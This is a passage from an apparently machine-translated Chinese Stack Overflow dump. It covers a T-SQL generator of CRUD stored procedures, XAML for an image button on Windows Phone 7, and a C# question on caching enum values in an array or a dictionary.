INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES ('Common','Drop statement to put at the end of final script',@DropStatement)

SELECT * FROM @StatementList
ORDER BY 1

END
GO

--For all tables of schema dbo of database "OlivierDb":
EXEC dbo.GenerateDynamicallyProceduresForTables 'OlivierDB','dbo' 

--With all possible parameters:
EXEC dbo.GenerateDynamicallyProceduresForTables @DatabaseName               = 'OlivierDB',
                                                @SchemaName                 = 'dbo',
                                                @TableName                  = 'Table5',
                                                @NoCount                    = 1,
                                                @ManageTransaction          = 1,
                                                @GenerateDebugScriptForList = 1,
                                                @ParameterForUser           = '@UserInP',
                                                @ParameterForCulture        = '@CultureInP',
                                                @FirstParametersAreMandatory= 1,
                                                @ProcedureTemplateName      = '[{SchemaName}].[{TableName}_Proc_{ActionType}]',
                                                @CreationUserMatch          = 'syscolumns.name LIKE ''%CreationUser%'' OR syscolumns.name LIKE ''%CreationBy%''',
                                                @CreationDateMatch          = 'syscolumns.name LIKE ''%CreationDate%'' OR syscolumns.name LIKE ''%CreatedDate%''',
                                                @ModificationUserMatch      = 'syscolumns.name LIKE ''%ModificationUser%'' OR syscolumns.name LIKE ''%ModifiedBy%''  OR syscolumns.name LIKE ''%ModifiedUser%''',
                                                @ModificationDateMatch      = 'syscolumns.name LIKE ''%ModificationDate%'' OR syscolumns.name LIKE ''%ModifiedDate%''' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-30T16:11:32.140

感谢原始脚本。
我用以下改进了它：
- 允许在另一个数据库上做
- 对于选择，根据参数动态生成查询
- 管理列 CreatedBy/Date 和 ModificationBy/Date
- 即使在模式/表/列中找到特殊字符也可以工作
- 允许系统地添加用户和文化。
- 程序名称模板
和很多选项。

注意：代码发送两个答案，限制为 30000 个字符。

```
IF OBJECT_ID('dbo.GenerateDynamicallyProceduresForTables','P') IS NOT NULL
    DROP PROCEDURE dbo.GenerateDynamicallyProceduresForTables
GO

CREATE PROCEDURE dbo.GenerateDynamicallyProceduresForTables @DatabaseName nvarchar(200)=NULL,
                                                            @SchemaName nvarchar(200) = NULL,
                                                            @TableName nvarchar(200) = NULL,
                                                            @NoCount bit=1,
                                                            @ManageTransaction bit=1,
                                                            @GenerateDebugScriptForList bit = 1,
                                                            @ParameterForUser nvarchar(20) = '@UserInP',
                                                            @ParameterForCulture nvarchar(20) = '@CultureInP',
                                                            @FirstParametersAreMandatory bit=1,
                                                            @ProcedureTemplateName nvarchar(100) = '[{SchemaName}].[{TableName}_Proc_{ActionType}]',
                                                            @CreationUserMatch nvarchar(500) = 'syscolumns.name LIKE ''%CreationUser%'' OR syscolumns.name LIKE ''%CreationBy%''',
                                                            @CreationDateMatch nvarchar(500) = 'syscolumns.name LIKE ''%CreationDate%'' OR syscolumns.name LIKE ''%CreatedDate%''',
                                                            @ModificationUserMatch nvarchar(500) = 'syscolumns.name LIKE ''%ModificationUser%'' OR syscolumns.name LIKE ''%ModifiedBy%''  OR syscolumns.name LIKE ''%ModifiedUser%''',
                                                            @ModificationDateMatch nvarchar(500) = 'syscolumns.name LIKE ''%ModificationDate%'' OR syscolumns.name LIKE ''%ModifiedDate%'''
AS
BEGIN
DECLARE @UnCommentExecForDebug bit=0 --To set at 0 for final

DECLARE @StatementList TABLE(id INT IDENTITY(1,1) NOT NULL PRIMARY KEY,FullTableName nvarchar(1000),StatementType nvarchar(100),Statement nvarchar(max))  
DECLARE @FirstParameters nvarchar(400)='',@FirstParametersForExec nvarchar(400)=''

IF LEN(@ParameterForUser)>1 
BEGIN
  SET @FirstParameters = @FirstParameters + @ParameterForUser  +' nvarchar(500)' + CASE WHEN @FirstParametersAreMandatory =0  THEN ' = NULL' ELSE '' END +  ', 
    '
  SET @FirstParametersForExec = @FirstParametersForExec + @ParameterForUser + CASE WHEN @FirstParametersAreMandatory =0  THEN ' = NULL' ELSE ' =''K2:Denallix\Administrator''' END +  ', 
    '
END
IF LEN(@ParameterForCulture)>1
BEGIN
  SET @FirstParameters = @FirstParameters + @ParameterForCulture  + ' nvarchar(10)' + CASE WHEN @FirstParametersAreMandatory =0  THEN ' = NULL' ELSE '' END +  ', 
    '
  SET @FirstParametersForExec = @FirstParametersForExec + @ParameterForCulture + CASE WHEN @FirstParametersAreMandatory =0  THEN ' = NULL' ELSE '=''en-gb''' END +  ', 
    '
END
IF NOT(LEN(@DatabaseName)>0)
 SET @DatabaseName=DB_NAME()

 IF LEN(@SchemaName)=0
 SET @SchemaName=NULL

 IF LEN(@TableName)=0
 SET @TableName=NULL

IF NOT(LEN(@CreationUserMatch)>0)  
   SET @CreationUserMatch = 'syscolumns.name = ''BIDON12345678917071979'''

IF NOT(LEN(@CreationDateMatch)>0)  
   SET @CreationDateMatch = 'syscolumns.name = ''BIDON12345678917071979'''

IF NOT(LEN(@ModificationUserMatch)>0)  
   SET @ModificationUserMatch = 'syscolumns.name = ''BIDON12345678917071979'''

IF NOT(LEN(@ModificationDateMatch)>0)  
   SET @ModificationDateMatch = 'syscolumns.name = ''BIDON12345678917071979'''

DECLARE @strSpText nVarchar(max) ='USE [' + @DatabaseName + ']'
IF @DatabaseName!=DB_NAME()
INSERT INTO @StatementList (FullTableName,StatementType,Statement) VALUES ('Common','Set current database',@strSPText)

 DECLARE @sqlstatementForTables nvarchar(max) = -- Not test with USE [' + @DatabaseName + '] ISSUE ON Table iDENTITY.Identity: 'Could not complete cursor operation because the set options have changed since the cursor was declared
      N'
      DECLARE Tables_cursor CURSOR FOR
       SELECT TABLE_SCHEMA,TABLE_NAME
         FROM [' + @DatabaseName + '].INFORMATION_SCHEMA.TABLES
        WHERE TABLE_TYPE=''BASE TABLE''
          AND (TABLE_SCHEMA=@pSchemaName OR @pSchemaName IS NULL)
          AND (Table_Name=@pTableName OR @pTableName IS NULL)'

     --EXEC loopbackServerForDebug.[K2FranceDebugDB].dbo.K2FranceDebug '@sqlstatementForColumns',@sqlstatementForColumns

      exec sp_executesql @sqlstatementForTables, N'@pSchemaName  nvarchar(200),@pTableName  nvarchar(200)', @pSchemaName=@SchemaName, @pTableName=@TableName;

OPEN Tables_cursor
DECLARE @CurrentSchemaName nvarchar(100),@CurrentFullTableName nvarchar(1000),@CurrentTableName nVarchar(1000),
        @DropStatement nvarchar(max)=''
Fetch next
from Tables_cursor
INTO @CurrentSchemaName,@CurrentTableName
WHILE @@FETCH_STATUS=0
BEGIN

    SET @CurrentFullTableName='['+@CurrentSchemaName+'].['+@CurrentTableName+']';
    --PRINT @CurrentFullTableName

    Declare @dbName nVarchar(50)
    Declare @insertSPName nVarchar(4000), @updateSPName nVarchar(4000), @deleteSPName nVarchar(4000), @listSPName nVarchar(4000)--, @ReadSPName nVarchar(50) ;
    Declare @ColumnParametersInsert nVarchar(max), @ColumnDefForInsert nVarchar(max),@ColumnInValueForInsert nVarchar(max),
            @ColumnParametersList nVarchar(max),@ColumnParametersListForExec nVarchar(max),
            @tableColumnForWhereInList nvarchar(max),
            @tableColumnForWhereInListVariables nVarchar(max), @tableColumnForWhereInListAffectVariables nVarchar(max),@DebugVariablesForList nvarchar(max)='',
            @ColumnParametersInsertForExec nvarchar(max)
    Declare @tableCols nVarchar(max), @ColumnParametersUpdate nVarchar(max),@ColumnParametersUpdateForExec nVarchar(max);
    Declare @space nVarchar(50) = REPLICATE(' ', 4) ;
    Declare @colName nVarchar(max) ;
    Declare @DataType nvarchar(200),@colVariable nVarchar(200),@colVariableProc nVarchar(200);
    Declare @colParameter nVarchar(max) ;
    Declare @colAllowNull nvarchar(15), @colIsPrimaryKey INT,@ColIsIdentityAutoIncrement INT,@ColLength INT,@ColIsComputed INT,@ColMatchCreationUser INT,@ColMatchCreationDate INT,@ColMatchModificationUser INT,@ColMatchModificationDate INT;

    Declare @updCols nVarchar(max);
    Declare @ColumnParametersDelete nVarchar(max),@ColumnParametersDeleteForExec nVarchar(max),
            @LastPrimaryKey nvarchar(max),@NbPrimaryKey INT=0,@ColNumber int=0
    Declare @whereCols nVarchar(2000);
    DECLARE @SetVariablesForExec nvarchar(max)='',@SetVariablesForExecUpdate nvarchar(max)='', @SetVariablesForExecDelete nvarchar(max)=''

    DECLARE @strBegin nvarchar(1000)=' AS' + CHAR(13) + CHAR(10) + 'BEGIN',@spaceForTrans nvarchar(10)=''
    IF @NoCount=1
      Set @strBegin = @strBegin + CHAR(13) + CHAR(10) + @space + 'SET NOCOUNT ON '

    IF @ManageTransaction = 1 
    BEGIN
        Set @strBegin = @strBegin + CHAR(13) + CHAR(10) + @space + 'SET XACT_ABORT ON -- if a Transact-SQL statement raises a run-time error, the entire transaction is terminated and rolled back.'
      Set @strBegin = @strBegin + CHAR(13) + CHAR(10) + ''
      Set @strBegin = @strBegin + CHAR(13) + CHAR(10) + @space + 'BEGIN TRAN '
      SET @spaceForTrans= @space;
    END
    DECLARE @strEnd nvarchar(1000)=''
    IF @ManageTransaction = 1 
      Set @strEnd = @strEnd + CHAR(13) + CHAR(10) + @space + 'COMMIT TRAN '
    SET @strEnd = @strEnd + CHAR(13) + CHAR(10) + 'END'
    Set @strEnd = @strEnd + CHAR(13) + CHAR(10) + 'GO'
    Set @strEnd = @strEnd + CHAR(13) + CHAR(10) + ''
    IF @UnCommentExecForDebug = 0 Set @strEnd = @strEnd + CHAR(13) + CHAR(10) + '/*'

    IF @ProcedureTemplateName IS NULL
      BEGIN
        Set @insertSPName = '['+@CurrentSchemaName+'].[sp_' + @CurrentTableName +'_insert]' ;
        Set @updateSPName = '['+@CurrentSchemaName+'].[sp_' + @CurrentTableName +'_update]' ;
        Set @deleteSPName = '['+@CurrentSchemaName+'].[sp_' + @CurrentTableName +'_delete]' ;
        set @listSPName =  '['+@CurrentSchemaName+'].[sp_' + @CurrentTableName +'_list]' ;
      END
    ELSE
      BEGIN
         DECLARE @ProcedureName nvarchar(200)=REPLACE(REPLACE(@ProcedureTemplateName,'{SchemaName}',ISNULL(@SchemaName,@CurrentSchemaName)),'{TableName}',ISNULL(@TableName,@CurrentTableName));
         Set @insertSPName = REPLACE(@ProcedureName,'{ActionType}','Insert')
         Set @updateSPName = REPLACE(@ProcedureName,'{ActionType}','Update')
         Set @deleteSPName = REPLACE(@ProcedureName,'{ActionType}','Delete')
         Set @listSPName = REPLACE(@ProcedureName,'{ActionType}','List')   
      END

SET @DropStatement = @DropStatement+ '
DROP PROCEDURE ' + @insertSPName + '
DROP PROCEDURE ' + @updateSPName + '
DROP PROCEDURE ' + @deleteSPName +'
DROP PROCEDURE ' + @listSPName 

    Set @ColumnParametersInsert = @FirstParameters ;
    SET @ColumnParametersInsertForExec = @FirstParametersForExec
    Set @ColumnParametersUpdate=@FirstParameters
    SET @ColumnParametersUpdateForExec=@FirstParametersForExec
    Set @ColumnParametersDelete = @FirstParameters ;
    SET @ColumnParametersDeleteForExec = @FirstParametersForExec ;
    SET @ColumnParametersList = @FirstParameters;
    SET @ColumnParametersListForExec = @FirstParametersForExec

    SET @tableColumnForWhereInList= ''
    SET @tableColumnForWhereInListVariables =''
    SET @tableColumnForWhereInListAffectVariables =''
    SET @DebugVariablesForList ='';
    Set @ColumnDefForInsert = '' ;
    Set @ColumnInValueForInsert = '' ;
    Set @strSPText = '' ;
    Set @tableCols = '' ;
    Set @updCols = '' ;

    Set @whereCols = '' ;

    SET NOCOUNT ON

    CREATE TABLE #tmp_Structure (colid int,ColumnName nvarchar(max), 
                                 ColumnVariable nvarchar(max),
                                 DataType nvarchar(max), 
                                 ColumnParameter nvarchar(max), 
                                 AllowNull int, 
                                 IsPrimaryKey int, 
                                 IsIdentityAutoIncrement int, 
                                 ColLength int, 
                                 IsIsComputedColumn int,
                                 ColMatchCreationUser int,ColMatchCreationDate int,
                                 ColMatchModificationUser INT,ColMatchModificationDate INT)

    DECLARE @sqlstatementForColumns nvarchar(max) = 
      N'USE [' + @DatabaseName + ']
      SELECT distinct
           --sysobjects.name as ''Table'',
           syscolumns.colid ,
           ''['' + syscolumns.name + '']'' as ''ColumnName'',
           ''@''+syscolumns.name as ''ColumnVariable'',           
           systypes.name +
           Case When systypes.xusertype in (165,167,175,231,239 ) Then ''('' + Convert(varchar(10),Case When syscolumns.length=-1 Then ''max'' else CAST(syscolumns.length AS nvarchar(10)) end) +'')'' Else '''' end as ''DataType'' ,
           systypes.name +  Case When systypes.xusertype in (165,167,175,231,239 ) Then ''('' + Convert(varchar(10),Case When syscolumns.length=-1 Then ''max'' else CAST(syscolumns.length AS nvarchar(10)) end) +'')'' Else '''' end as ''ColumnParameter'',
           COLUMNPROPERTY(OBJECT_ID(@pFullTableName),syscolumns.name,''AllowsNull'') AS AllowNull,
           /*CASE WHEN syscolumns.name IN (SELECT c.name AS ColumnName
                                             FROM [' + @DatabaseName + '].sys.columns AS c
                                                  INNER JOIN [' + @DatabaseName + '].sys.tables AS t ON t.[object_id] = c.[object_id]
                                            where c.is_identity = 1
                                              and t.name=@CurrentTableName) THEN ''1'' ELSE  ''0'' END IsPrimaryKey,
           */
           (SELECT COUNT(*) 
                    FROM [' + @DatabaseName + '].INFORMATION_SCHEMA.TABLE_CONSTRAINTS Tab, 
                         [' + @DatabaseName + '].INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE Col 
                   WHERE Col.Constraint_Name = Tab.Constraint_Name
                    AND Col.Table_Name = Tab.Table_Name
                    AND Constraint_Type = ''PRIMARY KEY''
                    AND Col.Table_Name = @pTableName
                    AND Tab.TABLE_SCHEMA=@pSchemaName
                    AND Col.Column_Name = syscolumns.name
                        ) AS IsPrimaryKey, 
           SC.is_identity AS IsIdentityAutoIncrement,
           syscolumns.length,
           (SELECT COUNT(*)
              FROM sys.computed_columns
             WHERE computed_columns.object_id=sysobjects.id
               AND computed_columns.Name=syscolumns.name) AS IsComputedColumn,
            CASE WHEN ' + @CreationUserMatch +' THEN 1 ELSE 0 END AS ColMatchCreationUser,
            CASE WHEN ' + @CreationDateMatch +' THEN 1 ELSE 0 END AS ColMatchCreationDate,
            CASE WHEN ' + @ModificationUserMatch +' THEN 1 ELSE 0 END AS ColMatchModificationUser,
            CASE WHEN ' + @ModificationDateMatch +' THEN 1 ELSE 0 END AS ColMatchModificationDate
    FROM sysobjects 
         LEFT JOIN syscolumns ON syscolumns.id=sysobjects.id
         LEFT JOIN systypes ON systypes.xusertype=syscolumns.xusertype
         LEFT JOIN sys.columns SC ON SC.object_id = sysobjects.id
                           AND SC.name=syscolumns.name
    Where sysobjects.xtype = ''u''
      and sysobjects.id = OBJECT_ID(@pFullTableName)
    Order by syscolumns.colid'

     --PRINT @sqlstatementForColumns
     --EXEC loopbackServerForDebug.[K2FranceDebugDB].dbo.K2FranceDebug '@sqlstatementForColumns',@sqlstatementForColumns

      INSERT INTO #tmp_Structure
      exec sp_executesql @sqlstatementForColumns, N'@pSchemaName  nvarchar(200),@pTableName  nvarchar(200),@pFullTableName nvarchar(1000)', @pSchemaName=@CurrentSchemaName, @pTableName=@CurrentTableName,@pFullTableName=@CurrentFullTableName;

      --SELECT * FROM #tmp_Structure

    /* Read the table structure and populate variables*/
    DECLARE SpText_Cursor CURSOR FOR
     SELECT ColumnName, ColumnVariable, DataType, ColumnParameter, AllowNull, IsPrimaryKey, IsIdentityAutoIncrement,ColLength, IsIsComputedColumn,ColMatchCreationUser,ColMatchCreationDate,ColMatchModificationUser,ColMatchModificationDate
       FROM #tmp_Structure
    OPEN SpText_Cursor

    FETCH NEXT FROM SpText_Cursor INTO @colName, @colVariable,  @DataType, @colParameter, @colAllowNull,@colIsPrimaryKey, @ColIsIdentityAutoIncrement,@ColLength, @ColIsComputed,@ColMatchCreationUser,@ColMatchCreationDate,@ColMatchModificationUser,@ColMatchModificationDate
    WHILE @@FETCH_STATUS = 0
    BEGIN
       SET @ColNumber=@ColNumber+1

       SET @SetVariablesForExec = @SetVariablesForExec  + CASE WHEN @colAllowNull =1 THEN '' 
                                                         ELSE  CASE WHEN @DataType  IN ('datetime','datetime2','smalldatetime','date') AND @SetVariablesForExec NOT LIKE '%@Date%' THEN CHAR(13) +CHAR(10) + 'DECLARE @Date datetime =GetDate()'  
                                                                            WHEN @DataType  IN ('uniqueidentifier') AND @SetVariablesForExec NOT LIKE '%@GuidTest%' THEN CHAR(13) +CHAR(10) + 'DECLARE @TheGuid uniqueidentifier  =NEWID()'                                                                             
                                                                            ELSE '' 
                                                                       END
                                                         END

       --RegEx to keep only alphanumeric characters:
       DECLARE @MatchExpression nvarchar(20) =  '%[^a-z0-9]%',@DateTypeWithoutSpecialCharacters nvarchar(100)=@DataType;

       WHILE PatIndex(@MatchExpression, @DateTypeWithoutSpecialCharacters) > 0
        SET @DateTypeWithoutSpecialCharacters = Stuff(@DateTypeWithoutSpecialCharacters, PatIndex(@MatchExpression, @DateTypeWithoutSpecialCharacters), 1, '')

       --Remove Special characters (like space...) for variable name
       WHILE PatIndex(@MatchExpression, @colVariable) > 0
        SET @colVariable = Stuff(@colVariable, PatIndex(@MatchExpression, @colVariable), 1, '')

       SET @colVariableProc = '@p'+ @colVariable 
       SET @colVariable = '@'+ @colVariable 

       SET @colParameter = @colVariable + ' ' + @colParameter 

       DECLARE @AffectationForExec nvarchar(max)=@colVariable + CASE WHEN @colAllowNull =1 THEN ' = NULL' 
                     ELSE ' = ' +  CASE WHEN @DataType IN ('Text','sysname') OR @DataType LIKE '%char%'  THEN '''' + SUBSTRING ( CAST(ABS(@ColLength) AS nvarchar(10)) + 'TEST' + @DateTypeWithoutSpecialCharacters,0,CASE WHEN @ColLength < 0 THEN 1000 WHEN @DataType LIKE 'nchar%' THEN @ColLength/2+1 ELSE @ColLength END) + ''''
                                        WHEN @DataType  IN ('int','numeric','bigint','tinyint') THEN CAST(@ColNumber AS nvarchar(10))   
                                        WHEN @DataType  IN ('bit') THEN '0'   
                                        WHEN @DataType  IN ('float') THEN CAST(@ColNumber AS nvarchar(10))   +  '.' + CAST(@ColNumber+1 AS nvarchar(10)) 
                                        WHEN @DataType  IN ('datetime','datetime2','smalldatetime','date') THEN '@Date'  
                                        WHEN @DataType  IN ('uniqueidentifier') THEN '@TheGuid'  
                                        WHEN @DataType  IN ('xml') THEN '''<testXML><value name="test">' + CAST(@ColNumber AS nvarchar(10)) + '</value></testXML>''' 
                                        ELSE '''1''--Currently Not managed' 
                                   END
                END +  ', --Type ' + @DataType  + CHAR(13) + CHAR(10) + @space 

       IF @ColIsIdentityAutoIncrement = 0 AND @ColIsComputed = 0 
       BEGIN
          IF @ColMatchModificationUser = 0  AND @ColMatchModificationDate = 0
            Set @ColumnDefForInsert = @ColumnDefForInsert + @colName+ ',' + CHAR(13) + CHAR(10) + @space + @space + @spaceForTrans ;

          IF @ColMatchCreationUser= 0 AND @ColMatchCreationDate = 0 AND @ColMatchModificationUser = 0  AND @ColMatchModificationDate = 0
          BEGIN
            Set @ColumnParametersInsert = @ColumnParametersInsert + @colParameter + CASE WHEN @colAllowNull =1  THEN ' = NULL' ELSE '' END +  ','  + CHAR(13) + CHAR(10) + @space ;
            SET @ColumnParametersInsertForExec = @ColumnParametersInsertForExec + @AffectationForExec
          END 

          IF @ColMatchCreationUser= 1
          BEGIN
            IF LEN(@ParameterForUser)>1 
               Set @ColumnInValueForInsert = @ColumnInValueForInsert + 'ISNULL(' + @ParameterForUser + ',SYSTEM_USER)'
            ELSE
               Set @ColumnInValueForInsert = @ColumnInValueForInsert + 'SYSTEM_USER'
          END
          ELSE
          BEGIN
            IF @ColMatchCreationDate= 1
              Set @ColumnInValueForInsert = @ColumnInValueForInsert + 'GETDATE()'  
            ELSE
              IF @ColMatchModificationUser = 0  AND @ColMatchModificationDate = 0
                Set @ColumnInValueForInsert = @ColumnInValueForInsert + @colVariable
          END
          IF @ColMatchCreationUser= 1 OR @ColMatchCreationDate= 1 OR @ColMatchModificationUser = 0  AND @ColMatchModificationDate = 0
        SET @ColumnInValueForInsert =@ColumnInValueForInsert + ',' + CHAR(13) + CHAR(10) + @space + @space+ @spaceForTrans

          Set @tableCols = @tableCols + @colName + ',' ;

          IF @ColMatchModificationUser = 1
          BEGIN
             IF LEN(@ParameterForUser)>1 
               Set @updCols = @updCols + @colName + ' = ISNULL(' + @ParameterForUser + ',SYSTEM_USER)'; 
            ELSE
               Set @updCols = @updCols + @colName + ' = SYSTEM_USER'; 
          END 
          ELSE
          BEGIN
            IF @ColMatchModificationDate = 1
               Set @updCols = @updCols + @colName + ' = GETDATE()';     
            ELSE
              IF @ColMatchCreationUser=0 AND @ColMatchCreationDate=0
              Set @updCols = @updCols + @colName + ' = ' + @colVariable;     
          END   
          IF @ColMatchModificationUser = 1 OR @ColMatchModificationDate = 1 OR @ColMatchCreationUser=0 AND @ColMatchCreationDate=0
        SET @updCols =@updCols + ',' + CHAR(13) + CHAR(10) + @space + @space+ '   ' + @spaceForTrans

       END

       SET @ColumnParametersList = @ColumnParametersList + @colParameter + ' = NULL' +  ','  + CHAR(13) + CHAR(10) + @space ;
       SET @ColumnParametersListForExec = @ColumnParametersListForExec+  @colVariable + ' = NULL, --Type ' + @DataType  + CHAR(13) + CHAR(10) + @space 

       IF @ColIsIdentityAutoIncrement = 1 AND @DataType='int'
          BEGIN
            SET @SetVariablesForExecUpdate =   CHAR(13)+CHAR(10)+'DECLARE @PrimaryKeyValue INT= (SELECT MIN(' + @colName + ') FROM ' + @CurrentFullTableName + ')'
            SET @AffectationForExec = @colVariable  + '= @PrimaryKeyValue, --Type ' + @DataType  + CHAR(13) + CHAR(10) + @space 
          END 

       IF @ColIsComputed = 0 AND @ColMatchCreationUser=0 AND @ColMatchCreationDate=0 AND @ColMatchModificationUser=0 AND @ColMatchModificationDate=0
       BEGIN
         Set @ColumnParametersUpdate = @ColumnParametersUpdate + @colParameter + ',' + CHAR(13) + CHAR(10) + @space ;
         SET @ColumnParametersUpdateForExec = @ColumnParametersUpdateForExec + @AffectationForExec
       END

       IF @DataType NOT IN ('text') 
       BEGIN
         IF @DataType NOT IN ('Xml')
         BEGIN
             SET @tableColumnForWhereInList = @tableColumnForWhereInList + '
                 IF ' + @colVariable + ' IS NOT NULL
                   BEGIN
                     SET @Statement= @Statement+ @Separator + ''' + REPLACE(@colName,'''','''''') + '= '+  @colVariableProc +'''
                     SET @Separator = @SeparatorAnd
                   END'
             SET @tableColumnForWhereInListVariables = @tableColumnForWhereInListVariables + @space + @space + @space + @spaceForTrans + @colVariableProc + ' ' + @DataType +',
        '
             SET @tableColumnForWhereInListAffectVariables = @tableColumnForWhereInListAffectVariables + @space + @space + @space  + @spaceForTrans + @colVariableProc + '=' + @colVariable + ',
        '             
         END  
          SET @DebugVariablesForList = @DebugVariablesForList+ CHAR(13) +CHAR(10)  + @space + @space + @space + @space +@space+ @spaceForTrans 
          IF @DataType IN ('Xml')
            SET @DebugVariablesForList = @DebugVariablesForList+  'ISNULL(''DECLARE '+ @colVariableProc + ' ' + @DataType+' = CAST('''''' + REPLACE(CAST(' +@colVariable + ' as nvarchar(max)),'''''''','''''''''''') + ''''''AS XML);''+CHAR(13)+CHAR(10) ,'''') + '
          ELSE
            SET @DebugVariablesForList = @DebugVariablesForList+  'ISNULL(''DECLARE '+ @colVariableProc + ' ' + @DataType+' = '''''' + REPLACE(' +@colVariable + ','''''''','''''''''''') + '''''';''+CHAR(13)+CHAR(10) ,'''') + '
       END

       IF @colIsPrimaryKey= 1
       BEGIN
          IF @ColIsIdentityAutoIncrement = 1 AND @DataType='int'
          BEGIN
            SET @SetVariablesForExecDelete =   CHAR(13)+CHAR(10)+'DECLARE @PrimaryKeyValue INT= (SELECT MAX(' + @colName + ') FROM ' + @CurrentFullTableName + ')'
          END 

         SET @ColumnParametersDelete = @ColumnParametersDelete + @colParameter +', ' + CHAR(13) + CHAR(10) + @space ;

         SET @ColumnParametersDeleteForExec = @ColumnParametersDeleteForExec + @AffectationForExec
         SET @whereCols = @whereCols + @colName + ' = ' + @colVariable + ' AND ' ;
         SET @NbPrimaryKey = @NbPrimaryKey +1
         SET @LastPrimaryKey = @colName
       END
    FETCH NEXT FROM SpText_Cursor INTO @colName, @colVariable, @DataType,@colParameter, @colAllowNull,@colIsPrimaryKey,@ColIsIdentityAutoIncrement,@ColLength,@ColIsComputed,@ColMatchCreationUser,@ColMatchCreationDate,@ColMatchModificationUser,@ColMatchModificationDate
    END
    CLOSE SpText_Cursor
    DEALLOCATE SpText_Cursor

    IF @ColumnDefForInsert IS NULL
      RAISERROR('@ColumnDefForInsert IS NULL',16,1)
    IF @ColumnParametersInsert IS NULL
      RAISERROR('@ColumnParametersInsert IS NULL',16,1)
    IF @ColumnParametersInsertForExec IS NULL
      RAISERROR('@ColumnParametersInsertForExec IS NULL',16,1)
    IF @ColumnInValueForInsert IS NULL
      RAISERROR('@ColumnInValueForInsert IS NULL',16,1)
    IF @tableCols IS NULL
      RAISERROR('@tableCols IS NULL',16,1)
    IF @updCols IS NULL
      RAISERROR('@updCols IS NULL',16,1)

    IF @ColumnParametersDelete IS NULL
      RAISERROR('@ColumnParametersDelete IS NULL',16,1)
    IF @whereCols IS NULL
      RAISERROR('@whereCols IS NULL',16,1)

    DECLARE @LastPosOfComma INT

    If (LEN(@ColumnParametersUpdate)>0)
    BEGIN
      Set @ColumnParametersUpdate = LEFT(@ColumnParametersUpdate,LEN(@ColumnParametersUpdate)-3) ;
      SET @LastPosOfComma = LEN(@ColumnParametersUpdateForExec) - CHARINDEX(' ,',REVERSE(@ColumnParametersUpdateForExec))
      SET @ColumnParametersUpdateForExec = LEFT(@ColumnParametersUpdateForExec,@LastPosOfComma+3) + SUBSTRING(@ColumnParametersUpdateForExec,@LastPosOfComma+5,40000);
    END
     --See next post for the end of procedure 
```

# c# - 如何为 windows phone 7 的按钮设置图像内容

> ID：13429776
> 
> 赞同：0
> 
> 时间：2012-11-17T10:39:51.817
> 
> 标签：c#, silverlight, windows-phone-7

我正在尝试为按钮设置图像，我的图像中不包含文本，我想手动为该图像设置文本，我尝试了这种方式按钮与图像的按钮内容，但我不知道如何设置文本它，我在 Visual Studio 2012 for windows mobile 7 中工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:02:55.127

```
<Button x:Name="ButtonName" Height="Auto" Width="Auto">
    <StackPanel>
          <Image Source=image.JPG" Stretch="Fill" Height="Auto" Width="Auto" />
          <TextBlock Text="picture Button" TextAlignment="Center" />
    </StackPanel>
</Button> 
```

事情是不要设置按钮的内容属性。还要给按钮适当的大小，否则图像控件会使其过大

将您的控件放在可以容纳多个孩子而不是按钮支持的只有一个孩子的堆栈面板中，您可以更轻松地控制大小。

* * *

根据您提供的图像，这是我的代码。此外，您应该将该图片链接放在您的问题中

```
<Button  Content="Text" Height="Auto" Width="Auto" BorderThickness="0">
     <Button.Background>
          <LinearGradientBrush StartPoint="0 0" EndPoint="0 1">
               <LinearGradientBrush.GradientStops>
                   <GradientStopCollection>
                       <GradientStop Offset="0" Color="#FF03CCF0" />
                       <GradientStop Offset="1" Color="#FF0182C2" />
                   </GradientStopCollection>
               </LinearGradientBrush.GradientStops>
           </LinearGradientBrush>
      </Button.Background>
  </Button> 
```

根据需要更改按钮大小。此外，您可能需要使用 VisualStateManager 更改其他视觉状态的背景，但结果会更清晰。也有非常肮脏的把戏。我没有发布它的代码。使用画布作为内容，设置它的背景，然后在里面插入一个文本块。我不知道这是否可行，但无论如何我都不会这样做。推荐使用 VisualStateManager。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T18:06:57.677

将 Image 用作 Button 的最简洁方法是设置 style 属性。

```
<Style x:Key="CustomButton" TargetType="Button">
    <Setter Property="Template" >
        <Setter.Value >
            <ControlTemplate>
                <Image Source="Images/Sample.jpg" />
            </ControlTemplate >
        </Setter.Value >
    </Setter > 
```

通过定义一个新块在您的页面中设置此代码，`<Grid.Resources></Grid.Resources>`或者您可以`StandardStyles.xaml`在定义新 Button 时通用地执行此操作，将`BasedOn`属性设置为您在样式中定义的 Key 值。

# c# - 将枚举存储在数组中 VS 存储在字典中？

> ID：13429779
> 
> 赞同：3
> 
> 时间：2012-11-17T10:40:03.923
> 
> 标签：c#

假设我有一些枚举。例如

```
enum MyEnum
{ 
    Item1, 
    Item2, 
    Item3
} 
```

我想为枚举中的每个项目“缓存”一些东西。所以我确实有两个选择。

字典选项：

`Dictionary<MyEnum, /*someStructure*/> cache = new Dictionary<MyEnum, /*someStructure*/>>();`

或数组选项：

```
/*someStructure*/[] cache = new /*someStructure*/[Enum.GetValues(typeof(MyEnum)).Length] 
```

这些选项的优缺点是什么？在我看来`Dictionary`，选项更具可读性和易于使用，但比`Array`选项慢。

但`Dictionary`实际上会更慢吗？可能`Dictionary`“聪明”足以理解什么时候`enum`用作键，那么只有“数组”可以用作底层实现？

所以问题是——“丑陋的`array`选择”会比“直截了当”的`Dictionary`选择更快吗？好吧，也许我可以测试一下……但是现在当我写下这个问题时，我想知道其他人的想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T10:52:06.750

`Dictionany<TKey, TValue>`不是“智能”并且不会针对任何给定的键进行优化。底层实现总是相同的。

但是，关于性能，`enum`在字典中使用值作为键比您预期的要慢得多，并且比作为键存储**要慢**`Int32`得多。原因是运行时在调用`GetHashCode()`. 如果实际上发现这很奇怪。

但是，当最易读的方法（使用枚举作为字典中的键）足够快时，所有这些都无关紧要。这里没有人可以为你回答这个问题。您将不得不对此进行测量。在证明解决方案对于您的情况（可能会）不够快之前，不要进行过早的优化并使用最易读/可维护的代码。

但是，不要切换到数组，而是尝试使用`Int32`键切换到字典：

```
var dictionary = new Dictionary<int,  /*someStructure*/>();

dictionary[(int)MyEnum.Item1] = /*new someStructure()*/; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:53:29.803

